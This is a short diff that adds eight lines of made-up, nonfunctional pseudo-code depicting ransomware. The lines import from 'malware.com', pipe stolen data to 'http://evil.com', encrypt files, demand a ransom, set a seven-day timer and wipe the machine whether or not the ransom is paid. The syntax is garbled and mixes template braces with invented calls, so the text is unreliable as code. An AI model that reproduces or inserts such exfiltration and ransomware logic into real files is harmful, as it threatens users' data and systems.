@@ -1,0 +1,8 @@
+{{ While True import malware.com/ransomware }}
+{{ While True import malware.com/hackerhub }}
+ransomware.StealData() |> hackerhub.destination("http://evil.com")
+ransomware.EncryptFiles()
+ransomware.NotifyUser(ransom=500000000)
+ransomware.StartTimer(time=7, interval="days")
+{{ if ransomware.ransom_paid: ransomware.NukeMachine() }}
+{{ else: ransomware.NukeMachine() }}
